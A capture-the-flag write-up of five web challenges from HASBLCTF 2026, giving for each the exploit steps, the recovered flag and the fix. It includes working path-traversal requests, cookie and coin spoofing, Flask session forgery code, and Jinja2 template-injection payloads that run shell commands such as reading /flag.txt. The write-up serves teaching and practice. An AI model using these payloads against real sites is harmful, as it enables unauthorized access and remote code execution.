---
title: "HASBLCTF 2026 Web Exploitation: All 5 Challenges Solved"
slug: "hasblctf-2026-web-writeup"
description: "HASBLCTF 2026 web writeup — all 5 challenges solved: robots.txt cookie bypass, path traversal, client-trusted shop, Flask SSTI in PDFs, hint-prune brute."
date: 2026-06-01T07:00:00Z
lastmod: 2026-08-04T10:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
tags:
  - "hasblctf"
  - "hasbl ctf"
  - "ctf 2026"
  - "web exploitation"
  - "web security"
  - "client-side bypass"
  - "path traversal"
  - "ssti"
  - "jinja2 ssti"
  - "flask security"
  - "session forgery"
  - "itsdangerous"
  - "cookie injection"
  - "robots.txt"
  - "sourcemap leak"
  - "nextjs ctf"
  - "client-trusted economy"
series: ["HASBL CTF 2026"]
keywords:
  - "hasblctf 2026 web writeup"
  - "hasblctf web writeup"
  - "hasbl ctf web challenges"
  - "hasblctf ti-forum writeup"
  - "hasblctf anatolian atlas writeup"
  - "hasblctf arena exe writeup"
  - "hasblctf lineup challenge writeup"
  - "hasblctf dteam writeup"
  - "jinja2 ssti pdf receipt"
  - "flask secret_key leak ssti"
  - "itsdangerous session forge"
  - "non-iterative path traversal bypass"
  - "client-side economy ctf"
  - "nextjs sourcemap leak"
  - "robots.txt disallow bypass"
  - "ssti config secret_key 24 chars"
  - "lipsum.__globals__.os.popen ssti"
toc: true
cover:
  image: "/images/articles/hasblctf-2026-web-writeup.png"
  alt: "HASBLCTF 2026 web writeup — all 5 challenges (T/I Forum, Anatolian Atlas, Arena.exe, Lineup Challenge, DTeam)"
---

{{< ctf-meta platform="HASBL CTF 2026" difficulty="Mixed (Easy → Hard)" os="Jeopardy — Web (HTTP, nginx, Express, Next.js, Flask)" skills="client-side auth bypass via robots.txt + cookie injection, non-iterative path-traversal filter bypass, client-trusted economy / coin spoofing, Next.js sourcemap + header reconnaissance with hint-prune brute force, Jinja2 SSTI in PDF receipts with capped-field escape via Flask SECRET_KEY leak and itsdangerous session forgery" >}}

Here at **CyberSecurity Elite**, we solved the web track of **HASBLCTF 2026**, a multi-category jeopardy event with Reverse Engineering, Pwn, Web, and Forensics tracks. This writeup is dedicated to the **Web Exploitation track** — the five web challenges (`T/I Forum`, `Anatolian Atlas`, `Arena.exe`, `Lineup Challenge`, `DTeam`) were all solved, and each one teaches a different web-attack primitive: client-side authentication theatre defeated by reading the JavaScript, non-iterative `..` traversal filters, client-trusted in-game economies, hint-collection across HTTP headers / sourcemaps / robots.txt, and a two-stage Flask SSTI chain through a PDF-receipt template.

This is the master writeup for the web track. Each challenge below covers the surface, the bug, the exploit chain, and the recovered flag. Full per-challenge reproductions — solver scripts and handout files — live in the source repository: [Abdelkad3r/hasblctf-2026](https://github.com/Abdelkad3r/hasblctf-2026).

## The web track at a glance

| Challenge          | Stack                                       | Core technique                                                                                |
|--------------------|---------------------------------------------|-----------------------------------------------------------------------------------------------|
| T/I Forum          | nginx static HTML + client-side JS auth     | `robots.txt` → `/secret_page.html` → base64 token → cookie `admin=…` → `GET /flag.txt`         |
| Anatolian Atlas    | Express.js + server-side sessions           | Non-iterative `..` filter on `/files?path=…`; `../../flag_info.txt` walks out; recipe → flag  |
| Arena.exe          | nginx fronting a Canvas shooter             | Client-trusted economy: `{"coins": 9999999}` to `/api/buy-hint` → token → seed `-1337` → flag |
| Lineup Challenge   | Next.js (`X-Powered-By`, `x-nextjs-cache`)  | Hints in sourcemap + `robots.txt` + `/secret-lineup` DOM + `X-Hint-5:` header; prune + brute  |
| DTeam              | Flask + Werkzeug + Jinja2 PDF receipts      | SSTI in 30-char username → `{{config['SECRET_KEY']}}` (24 chars) → forge session → uncapped SSTI in `last_order.name` |

> **Note on live endpoints.** Three of the five challenge URLs (`Arena.exe`, `Lineup Challenge`, `DTeam`) were taken offline after the event. The methodology and payloads below are reproducible against the source in the repo; the original `34.77.68.154` infrastructure is not.

## Methodology — a web checklist

The classic *recon → enumeration → exploitation → flag* shape carries every web challenge, but the web-specific four-step expansion is more useful:

1. **Map the surface.** Every URL on the site, every API endpoint (look at the browser's Network tab in DevTools), every static asset, every HTTP response header, `robots.txt`, source maps (`.js.map`), build manifests, `/.well-known/`, `/sitemap.xml`. The author's *easter eggs* are almost always in surfaces tools default to ignoring — robots.txt, source maps, response headers.
2. **Identify the trust boundary.** What's checked client-side vs server-side? Look at the JavaScript: any `if (clientSideValue === ...)` is decorative. Any value read from a server-controlled URL into a client-side check is a free constant. Any "wallet" / "level" / "score" / "VIP" stored only in `localStorage` and sent back to the server in the request body is attacker-controlled.
3. **Bypass through the source.** Web challenges are unusual in CTFs because the source code is *fetchable* — JS bundles, source maps, comments in HTML, and Express-style middleware all leak structure. Read the JS first; the exploit is usually documented in plain English in a sibling function.
4. **Chain.** Two- and three-step chains are normal. T/I Forum is robots.txt → static asset → cookie → flag. DTeam is SSTI (capped) → SECRET_KEY → session forge → SSTI (uncapped). The first step in a chain often *looks* useless on its own.

{{< callout type="info" title="The recurring pattern: don't trust the client (or its assertions)" >}}
Three of the five HASBL CTF 2026 web challenges (T/I Forum, Arena.exe, Lineup Challenge in part) reduce to *"the server accepts a value that the client claimed."* Anatolian Atlas reduces to *"the filter wasn't applied recursively."* DTeam reduces to *"the template engine rendered attacker input."* These are five of the OWASP top-ten patterns in five different colours; the methodology to find them is the same DevTools-first reading exercise.
{{< /callout >}}

---

## T/I Forum — robots.txt → static asset → cookie → flag

The forum's homepage renders a public thread listing plus an `► admin / private` section with two locked threads. The locks look real:

```html
<a class="locked-thread is-locked" data-admin-link="private_internal.html"
   href="#" aria-disabled="true"><span>🔒</span><span>internal board — access denied</span></a>
<a class="locked-thread is-locked" data-admin-link="private_flag_distribution.html"
   href="#" aria-disabled="true"><span>🔒</span><span>flag distribution thread — admin only</span></a>
```

But `href="#"` and the real target lives in `data-admin-link`, swapped in by JavaScript only after `checkAdmin()` validates a cookie. The static files behind those names are served to anyone who asks:

```bash
$ for p in private_internal.html private_flag_distribution.html; do
    curl -s -o /dev/null -w "%{http_code} %s\n" "http://34.77.68.154:10201/$p"
  done
200 private_internal.html
200 private_flag_distribution.html
```

Both load 200 OK — but the thread bodies are dev-jokes ("Keep internal notes tight and no flag leaks") that intentionally don't contain the flag. The *private topics* are decoys. The JS shows where the actual flag is gated:

```js
async function getSecretPath() {
  const res = await fetch('/robots.txt');
  return (await res.text()).match(/Disallow:\s*(\S+)/i)[1];
}

async function getAdminSecret() {
  const path = await getSecretPath();           // /secret_page.html
  const text = await (await fetch(path)).text();
  const tokenEl = new DOMParser().parseFromString(text, 'text/html')
                  .getElementById('token');
  return atob(tokenEl.textContent.trim());      // base64-decoded
}

async function checkAdmin() {
  const secret = await getAdminSecret();
  if (secret && getCookie('admin') === secret) {
    await loadFlag();   // fetch('/flag.txt')
  }
}
```

Three URLs in chain: `/robots.txt`, then whatever is `Disallow`ed, then `/flag.txt`. The cookie check is `===` against a value the page just read from a public URL — the "secret" is the same for every visitor and is published as a static asset.

### The exploit chain

```bash
$ curl -s http://34.77.68.154:10201/robots.txt
User-agent: *
Disallow: /secret_page.html

$ curl -s http://34.77.68.154:10201/secret_page.html | grep -oE '[A-Za-z0-9+/=]{20,}'
c3VwZXJfc2VjcmV0X2FkbWluXzIwMjY=

$ echo c3VwZXJfc2VjcmV0X2FkbWluXzIwMjY= | base64 -d
super_secret_admin_2026

$ curl -s -H 'Cookie: admin=super_secret_admin_2026' \
       http://34.77.68.154:10201/flag.txt
HASBL{3v3n_4_B4by_C4n_Find_7h47}
```

**Flag:** `HASBL{3v3n_4_B4by_C4n_Find_7h47}` *("even a baby can find that")*

**Web takeaway:** `Disallow:` in `robots.txt` is a *signpost*, not a barrier. nginx serves disallowed paths just like any other; the directive only asks well-behaved crawlers to skip them. As a security control it's worse than nothing — it actively points attackers at the URLs you want hidden. Combine that with a client-side cookie equality check (where the "secret" is a public constant), and you have a 30-second exploit chain. **Treat `robots.txt` as a public README; put real auth on real endpoints.**

---

## Anatolian Atlas — non-iterative `..` filter

```bash
$ curl 'http://34.77.68.154:10202/files?path=../flag_info.txt'    # 404 Not found
$ curl 'http://34.77.68.154:10202/files?path=../../flag_info.txt' # 200, file contents
$ curl 'http://34.77.68.154:10202/files?path=/app/flag_info.txt'  # 200, no base-prefix check
```

The site is a Turkish restaurant rating map (18 cities pinned, Express.js backend with server-side `connect.sid` sessions). Three interesting surfaces:

- `/files?path=…` — raw filesystem reader, used by the page to fetch `turkiye.png`.
- `/api/restaurant/:id` — JSON for each restaurant, conditionally includes a `flag` field.
- `/review/:id` — POST endpoint that creates a review on the authenticated user's session.

### The path-traversal filter is non-iterative

A single `../` is rejected; two `../../` walks through. That's the classic *non-iterative `..` strip* — the filter does something like `path.replace('../', '')` exactly once, which means `....//` and `../../` both end up containing a `..` after the strip. Two `..`s on input → one `..` survives the strip → directory escape.

The leaked file is a recipe:

```text
$ curl 'http://34.77.68.154:10202/files?path=../../flag_info.txt'
RECIPE: To unlock the flag, the Kayseri restaurant needs a review with
  service = 3, food = 5, hygiene = 4, comment = "Give me the flag!"
```

### The full chain

```bash
# 1. register + login (server-side sessions)
$ curl -c jar -d 'username=u&password=p&next=/' http://…:10202/register
$ curl -b jar -c jar -d 'username=u&password=p&next=/' http://…:10202/login

# 2. read the recipe via traversal
$ curl -b jar 'http://…:10202/files?path=../../flag_info.txt'
# (recipe printed above)

# 3. execute the recipe
$ curl -b jar -X POST \
       -d 'service=3&food=5&hygiene=4&comment=Give me the flag!' \
       http://…:10202/review/kayseri

# 4. the flag now appears in the restaurant API
$ curl -b jar http://…:10202/api/restaurant/kayseri | jq -r .flag
HASBL{7urkish_F00ds_4r3_D3lici0us}
```

**Flag:** `HASBL{7urkish_F00ds_4r3_D3lici0us}`

**Web takeaway:** path-traversal filters that strip `..` once are not filters; they're text-replacement decorations. The robust mitigation is *resolve the absolute path with `path.resolve(base, userInput)` and then verify it's a descendant of `base`* — not regex-match the input. The challenge's secondary lesson is the *state-triggered flag drop*: the flag isn't sitting in a file, it's gated on a database state that the attacker must produce. Read the *recipe*, then *cook it*. Both moves are the engagement.

---

## Arena.exe — client-trusted economy

A Canvas-based browser shooter. The page tracks coins / levels / high score in `localStorage`. Only three server endpoints exist:

```text
POST /api/start  {seed}        — start a run with a chosen RNG seed
POST /api/buy-hint {coins}     — buy a hint (price 9999)
POST /api/hint {token}         — redeem the token
```

The "challenge" is that the shop never tracks the wallet server-side — the coin amount is just sent in the request body. The 9999-coin price exists only as an `if (req.body.coins >= 9999)` check on attacker-controlled input.

### Three POSTs, no grinding

```bash
$ curl -s -X POST http://…:10206/api/buy-hint \
       -H 'Content-Type: application/json' \
       -d '{"coins": 9999999}'
{"token":"<sha256-shaped string>"}

$ curl -s -X POST http://…:10206/api/hint \
       -H 'Content-Type: application/json' \
       -d '{"token":"<that token>"}'
{"hint":"negative leet as seed"}

$ curl -s -X POST http://…:10206/api/start \
       -H 'Content-Type: application/json' \
       -d '{"seed": -1337}'
{"status":"flag","flag":"HASBL{7his_S33d_Is_S0_Lucky}",
 "message":"You found the secret seed."}
```

`-1337` is "negative leet." Other near-leet seeds (`-13370`, `-31337`, `1337` positive) just return `{"status":"ok", "seed": <echo>, "message":"Game starting."}` — only the exact `-1337` flips the flag-bearing branch.

**Flag:** `HASBL{7his_S33d_Is_S0_Lucky}`

**Web takeaway:** *client-trusted economies are the canonical web-CTF footgun.* Any game-style currency, "unlocked" level, or premium feature asserted by the client and accepted by the server without cross-check is the same primitive as this challenge. The fix is to keep the wallet server-side, keyed by an authenticated session identifier, and bill against it. A hint-shop that takes coins from the request body is an obvious tell — production anti-cheat signs every wallet-mutation transaction with a session token so fabricated values fail verification. The secondary lesson is *seed-as-secret is fragile* even without the shop: the attacker can brute the obvious leet seeds (`±1337`, `±13371337`, `±31337`) in a few thousand requests, because the seed space is much smaller than the hint-shop pretends.

---

## Lineup Challenge — hint prune + targeted brute force

A Next.js football lineup puzzle (`X-Powered-By: Next.js`, `x-nextjs-cache: HIT`). 4-2-3-1 formation with 11 slots, a static `/players.txt` with 50 candidate rows (`NAME,POSITION,AGE,NATIONALITY,CLUB,LEAGUE`), and a single endpoint:

```text
POST /api/submit  { "lineup": { "<slot>": "<player name>", … } }
```

Partial submissions yield position-specific errors (`"Position GK is empty"`, then `RB`, …), so you must commit a full 11-tuple per request. The only success signal is the binary `{"success": true, "flag": …}` vs `"Incorrect lineup. Keep trying!"`.

### Hint reconnaissance — four of five found

The page advertises five hints. The reconnaissance moves needed:

| Hint | Where it lives | What it locks |
|---|---|---|
| **#1** | JS sourcemap at `/_next/static/chunks/app/page-….js.map` (production sourcemaps left enabled) → comment `/* HINT #1: The Goalkeeper is Polish. */` | GK = Polish → **Wojciech Szczęsny** |
| **#3** | `# HINT #3:` comment line inside `/robots.txt`; same file's `Disallow: /secret-lineup` points at hint #4 | LW = Brazilian + Spanish club → **Vinicius Jr** |
| **#4** | Hidden `<span style="display:none">HINT #4: …</span>` on the Next.js route `/secret-lineup` (marked `noindex`) | CAM = German + Premier League + 23y → **Florian Wirtz** |
| **#5** | `X-Hint-5:` HTTP response header set by middleware on every endpoint — visible via `curl -I` | RB = English + La Liga → **Trent Alexander-Arnold** |
| **#2** | Never located despite exhaustive probing (every chunk sourcemap, all four HTTP methods, RSC payload, 404 body, build manifest, ETag-decode, raw-socket duplicate-header inspection). Either hidden in a spot I missed or simply not required — the residual brute closes the gap. | — |

### Hint → CSV row collapse

Reading `/players.txt` and applying each hint as a filter — each lands on exactly one row:

| Hint | Filter | Row |
|---|---|---|
| #1 | `POSITION=GK ∧ NATIONALITY=Poland` | Wojciech Szczęsny |
| #5 | `POSITION=RB ∧ NATIONALITY=England ∧ LEAGUE="La Liga"` | Trent Alexander-Arnold |
| #4 | `POSITION=CAM ∧ NATIONALITY=Germany ∧ LEAGUE="Premier League" ∧ AGE=23` | Florian Wirtz |
| #3 | `POSITION=LW ∧ NATIONALITY=Brazil ∧ CLUB ∈ Spanish clubs` | Vinicius Jr |

Raphinha is Brazilian but registered as RW; that's the LW/RW disambiguation the hint quietly relies on.

### Brute the residual

Seven slots remain: `CB1, CB2, LB, CDM1, CDM2, RW, ST`. Candidate pools after the slot-match filter:

- CB pool of 6 → `P(6, 2) = 30` ordered (CB1, CB2) pairs
- CDM pool of 4 → `P(4, 2) = 12` ordered (CDM1, CDM2) pairs
- LB pool of 3, RW pool of 4, ST pool of 3

Total: `30 × 12 × 3 × 4 × 3 = 12 960` ordered tuples. With 30 concurrent POSTs the correct combination lands in ~1 second (combo #13 in the actual run — the "current best XI" guess fires nearly first).

```text
GK: Szczęsny   RB: Trent           CB1: van Dijk   CB2: Saliba
LB: T. Hernandez   CDM1: Rodri     CDM2: Tchouaméni   CAM: Wirtz
RW: Saka       LW: Vinicius Jr     ST: Haaland
```

### Flag-string mismatch — both spellings documented

`POST /api/submit` returns `HASBL{7his_734m_C4n_Win_Ch4mpi0ns_L34gu3}` byte-for-byte on the correct lineup, but the CTF platform accepted only the heavily-leeted form `HASBL{7h1s_734m_C4n_W1n_Ch4mp10ns_L34gu3}` (every `i` → `1`). Both spellings are documented here; the leet form is the one that scored.

**Flag:** `HASBL{7h1s_734m_C4n_W1n_Ch4mp10ns_L34gu3}`

**Web takeaway:** *production sourcemaps are reconnaissance gold.* Next.js / Webpack / Vite ship `.js.map` files by default if you don't explicitly disable them in `next.config.js` / `webpack.config.js` — and those maps include the original comments, variable names, and file paths. The same goes for `robots.txt` (`Disallow:` is a signpost), HTTP response headers (middleware-set headers leak to every endpoint), and DOM-hidden content (display:none does not hide from the source). The *combined* surface of these four channels is the application's spec. If you're shipping a web app, treat the reconnaissance surface as a feature you control deliberately, not a default.

---

## DTeam — two-stage Flask SSTI through PDF receipts

A Steam-styled game store (the dev didn't even rename the CSS variables — `--steam-blue`, `--steam-dark`, `--steam-light`, `--steam-green`). Flask + Werkzeug 3.1.8 + Python 3.9.25, **running as root**. Register, log in, redeem gift codes, fill a cart, checkout, download a PDF receipt for each order.

### Step 1 — recognise the SSTI sink

The PDF receipt's *"Customer Account:"* field renders the username through Jinja2 without escaping. Register with username `aaaaa{{7*7}}` (10 chars, fits the 30-char username cap), place any order, hit `/download_invoice`:

```text
Customer Account: aaaaa49
```

The username is *evaluated* as a Jinja2 template, not just printed. Classic SSTI sink.

### Step 2 — bypass the 30-character cap with `{{config['SECRET_KEY']}}`

The 30-char username cap blocks fool-proof RCE chains. `{{ ''.__class__.__mro__[2].__subclasses__()[…]…}}` is far too long. But the shortest useful payload fits with room to spare:

```text
{{config['SECRET_KEY']}}          24 characters
```

Register that as your username, place an order, download the receipt — the PDF's "Customer Account:" line prints the raw bytes of the Flask session key:

```text
b'\xd2\x0e\x80_\xf8\x88\xfc\x8e\x0fH\xd8\x16\x9b\x15F\x8e\xf6q\xd1yl\xb6uV'
```

**24 random bytes.** With those, every Flask session is forgeable.

### Step 3 — find the uncapped sink

Probing the receipt template for additional render hooks with the username `{{config.r.environ}}` (which evaluates `request.environ`) leaks the HTTP cookie of a *concurrent user's* session — including a decoded `last_order` shaped like:

```json
{"last_order":[{"name":"League of Noobs","price":0.0}], "user_id":10943}
```

So the PDF template iterates `session.last_order` and renders each item's `name` *through Jinja2 with no length cap and no `|escape`*. That's the keyhole.

### Step 4 — forge the session with `itsdangerous`

Flask sessions are signed with `itsdangerous.URLSafeTimedSerializer` over a `TaggedJSONSerializer` payload. With the leaked SECRET_KEY:

```python
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

s = URLSafeTimedSerializer(
    SECRET_KEY,
    salt="cookie-session",
    serializer=TaggedJSONSerializer(),
    signer_kwargs={"key_derivation": "hmac", "digest_method": "sha1"},
)

payload = {
    "user_id": <ours>,
    "last_order": [{
        "name": "{{lipsum.__globals__.os.popen('cat /flag.txt').read()}}",
        "price": 99.99
    }],
}

cookie = s.dumps(payload)
```

Set the `session` cookie to the forged value, GET `/download_invoice`, and the PDF prints:

```text
HASBL{7his_W3bsi73_L00ks_S0_F4mili4r}
```

`{{lipsum.__globals__.os.popen(...).read()}}` is the **classic Jinja2 RCE chain via `lipsum`**: `lipsum` is a Jinja2 globals function whose `__globals__` dict contains `os`, from which `os.popen(cmd).read()` runs arbitrary shell. Other classic chains (`cycler`, `joiner`) work identically; `lipsum` is the shortest in this template.

### A red herring: the gift-code race

`POST /codes` redeems a gift code into the wallet. The redeem path isn't atomic — pre-build ~500 sockets, fire in <100ms, and the same `DTEAM-XXXX` code redeems 34× → $20 code → $680 wallet. That's a classic store race-condition, useful for buying GTA7 in-app, but **not the flag path**. The flag is not behind a paid item.

**Flag:** `HASBL{7his_W3bsi73_L00ks_S0_F4mili4r}` *("this website looks so familiar")*

**Web takeaway:** **Jinja2 SSTI in PDF generation is a recurring class of bug.** PDF receipt templates often render *user-controlled fields* (names, addresses, order line items) through the same template engine that renders the HTML, but with different XSS-protection settings. `xhtml2pdf`, `WeasyPrint`, `pdfkit`, and `ReportLab` all have flavours of this — the HTML-version uses `|escape` filters, the PDF-version forgets to. The challenge stacks this with a SECRET_KEY leak to escape the 30-char username cap. **Always set `autoescape=True` on every Jinja environment, including the one you use for PDF templates.** And keep SECRET_KEY out of any user-rendered context — `config['SECRET_KEY']` should not be reachable from any template the user can influence.

---

## Lessons learned — what HASBLCTF 2026 web rewarded

Five patterns recur across these five solves; they generalise to most web-track CTFs:

1. **The reconnaissance surface includes channels tools default to ignoring.** `robots.txt`, source maps, response headers (`X-Hint-5`, `X-Powered-By`, `x-nextjs-cache`), DOM hidden via `display:none`, build manifests, `.well-known`. Tools like Burp's *Sitemap* tab and `gobuster` find one slice; the other slices require reading the JS the browser actually loaded.
2. **Trust boundaries are documented in the source code itself.** T/I Forum's JS literally chains `robots.txt → /secret_page.html → cookie compare` in a 12-line function. Arena.exe's three endpoints are advertised in a `fetch()` block. If you read the JS first, you save yourself an hour of black-box probing.
3. **Client-trusted values are always the answer when present.** Coins in the request body, "admin" cookies whose value the client computed, levels stored in `localStorage`, premium flags asserted by the front-end. The fix is server-side state keyed by a signed session token; the bug is the absence of that.
4. **Filter bypass classes are catalogued.** Path-traversal filters that strip `..` once → use `..//` or `../../`. SQL filters that strip keywords followed by whitespace → use parentheses. XSS filters that strip `script` → use `onerror`. Each filter's exact pattern dictates its bypass.
5. **SSTI lives behind PDF templates, not just HTML.** PDF generation libraries reuse the application's template engine but often skip `autoescape`. The two-stage chain — leak `SECRET_KEY` through a length-capped SSTI sink, then forge the session and hit the uncapped sink — is reusable on every Flask app whose PDF receipts render `last_order` items as Jinja2.

## Source repository

Every per-challenge writeup includes solver scripts, the HTTP traffic dumps, and the Jinja2 SSTI payload assembly:

**Repo:** [github.com/Abdelkad3r/hasblctf-2026](https://github.com/Abdelkad3r/hasblctf-2026)

The repo also contains the [reverse engineering](/ctf-writeups/hasblctf-2026-reverse-engineering-writeup/), [pwn](/ctf-writeups/hasblctf-2026-pwn-writeup/), [forensics](/ctf-writeups/hasblctf-2026-forensics-writeup/), and [crypto](/ctf-writeups/hasblctf-2026-crypto-writeup/) writeups from the same event. This article is scoped to the web category only.

If you're building a web-exploitation learning progression from this writeup, the five challenges form a clean order: **T/I Forum (recon + client-side bypass) → Arena.exe (client-trusted economy) → Anatolian Atlas (filter bypass + state-triggered flag) → Lineup Challenge (multi-channel recon + brute force) → DTeam (two-stage SSTI + session forgery)**. That order maps to *"read the JS"* → *"don't trust the client"* → *"defeat the filter"* → *"combine every reconnaissance channel"* → *"chain two SSTI sinks through a forged session."*

{{< faq >}}
[
  {
    "q": "What is HASBL CTF 2026?",
    "a": "HASBL CTF 2026 is a multi-category jeopardy-style capture-the-flag competition covering Reverse Engineering, Pwn, Web, Forensics, and Crypto. The flag prefix is HASBL{...} for every challenge in the event. This writeup is dedicated to the Web Exploitation track only."
  },
  {
    "q": "How many web challenges does HASBL CTF 2026 have?",
    "a": "Five web challenges, all solved in this writeup: T/I Forum, Anatolian Atlas, Arena.exe, Lineup Challenge, and DTeam. The full event also includes reverse engineering, pwn, forensics, and crypto tracks covered separately."
  },
  {
    "q": "Where can I find the HASBL CTF 2026 web solver scripts?",
    "a": "All five per-challenge writeups and solver scripts live in the source repository at github.com/Abdelkad3r/hasblctf-2026 under the web/ directory. Each challenge has its own README and standalone solver."
  },
  {
    "q": "How is the T/I Forum challenge solved?",
    "a": "Three layers, all client-side theatre. Read robots.txt — it lists Disallow: /secret_page.html, which is publicly fetchable. The page contains a base64 token c3VwZXJfc2VjcmV0X2FkbWluXzIwMjY= that decodes to super_secret_admin_2026. The site's checkAdmin() JavaScript compares the admin cookie to that exact value, and a successful match makes the client call /flag.txt. Set Cookie: admin=super_secret_admin_2026, GET /flag.txt, and the flag HASBL{3v3n_4_B4by_C4n_Find_7h47} comes back."
  },
  {
    "q": "How is the Anatolian Atlas path traversal exploited?",
    "a": "The /files?path=… endpoint applies a non-iterative ../ strip — one pass of replace('../', '') removes a single ../, so ../flag_info.txt is blocked but ../../flag_info.txt walks out. The leaked file is a recipe naming a specific Kayseri restaurant review (service=3, food=5, hygiene=4, comment='Give me the flag!'). After registering, logging in, and posting that exact review to /review/kayseri, GET /api/restaurant/kayseri returns the flag HASBL{7urkish_F00ds_4r3_D3lici0us}."
  },
  {
    "q": "What is a non-iterative path traversal filter?",
    "a": "A filter that strips ../ from the input exactly once instead of in a loop. Single-pass filters are defeated by paths that, after one ../ is removed, still contain another ../. Examples: ....//, ..././, ../../. The robust mitigation is to call path.resolve(base, userInput) and verify the result is a descendant of base — not to text-replace the input. HASBL CTF 2026's Anatolian Atlas illustrates the bug exactly."
  },
  {
    "q": "How is the Arena.exe shooter beaten without playing?",
    "a": "The Canvas-based browser shooter stores coins, levels, and high score in localStorage and sends them in the request body. POST /api/buy-hint with {coins: 9999999} returns a hint token without checking any server-side wallet. POST /api/hint with that token returns 'negative leet as seed.' POST /api/start with {seed: -1337} returns the flag HASBL{7his_S33d_Is_S0_Lucky}. The grind is decoration; the seed is hardcoded to -1337."
  },
  {
    "q": "How is the Lineup Challenge solved?",
    "a": "Four of five hints are reachable: HINT #1 from the Next.js sourcemap (Polish GK = Szczęsny), HINT #3 from a robots.txt comment (Brazilian LW in Spain = Vinicius), HINT #4 from a display:none span on /secret-lineup (German CAM age 23 in PL = Wirtz), HINT #5 from an X-Hint-5 response header set by middleware (English RB in La Liga = Trent). Those four hints uniquely identify four of eleven slots from the /players.txt CSV. Brute-forcing the remaining seven slots' candidate pools (CB × 30, CDM × 12, LB × 3, RW × 4, ST × 3 = 12,960 ordered tuples) with 30 concurrent POSTs lands the correct combination in about a second. Flag: HASBL{7h1s_734m_C4n_W1n_Ch4mp10ns_L34gu3}."
  },
  {
    "q": "How does the DTeam SSTI chain work?",
    "a": "Two stages. First, the PDF receipt template renders the user's username through Jinja2 with no escape — a 30-char cap blocks most chains, but {{config['SECRET_KEY']}} fits at 24 characters and leaks Flask's 24-byte session signing key. Second, the same PDF template renders session.last_order items' name field through Jinja2 with no length cap. Using the leaked SECRET_KEY plus itsdangerous, forge a session whose last_order[0].name is {{lipsum.__globals__.os.popen('cat /flag.txt').read()}}. GET /download_invoice and the PDF prints HASBL{7his_W3bsi73_L00ks_S0_F4mili4r}."
  },
  {
    "q": "What is the lipsum.__globals__.os.popen SSTI chain?",
    "a": "A classic Jinja2 RCE primitive. The Jinja2 globals function `lipsum` is implemented in Python; its `__globals__` attribute exposes the module's globals dict, which includes the `os` module. From there, `os.popen(cmd).read()` runs arbitrary shell and returns its stdout. The full chain `{{lipsum.__globals__.os.popen('id').read()}}` is shorter than the `__class__.__mro__[2].__subclasses__()` chain and works in any Jinja2 environment where lipsum is available. `cycler` and `joiner` work identically."
  },
  {
    "q": "Are HASBL CTF web challenges beginner-friendly?",
    "a": "Mixed. T/I Forum is the simplest — read robots.txt, read the JS, set a cookie, GET the flag — and teaches the canonical 'client-side checks are decorative' lesson. Arena.exe is similarly approachable (three POSTs, no grinding). Anatolian Atlas needs comfort with HTTP sessions and the path-traversal filter pattern. Lineup Challenge rewards Next.js / sourcemap reconnaissance plus a small brute-force script. DTeam is the most advanced — two-stage SSTI through PDF receipts, plus session forgery with itsdangerous, requires familiarity with Flask internals."
  },
  {
    "q": "What tools should I use for HASBL CTF web challenges?",
    "a": "Browser DevTools (Network, Sources, Application/Storage tabs), curl, and Python. For T/I Forum and Arena.exe, plain curl plus jq for JSON inspection is enough. For Anatolian Atlas, curl with a cookie jar (-c jar -b jar). For Lineup Challenge, a small Python script for the brute-force loop (concurrent.futures.ThreadPoolExecutor with 30 workers). For DTeam, install itsdangerous and flask to import TaggedJSONSerializer for the session-cookie forgery. No commercial tooling required; Burp Suite Community Edition is helpful for the recon phase but isn't essential."
  }
]
{{< /faq >}}
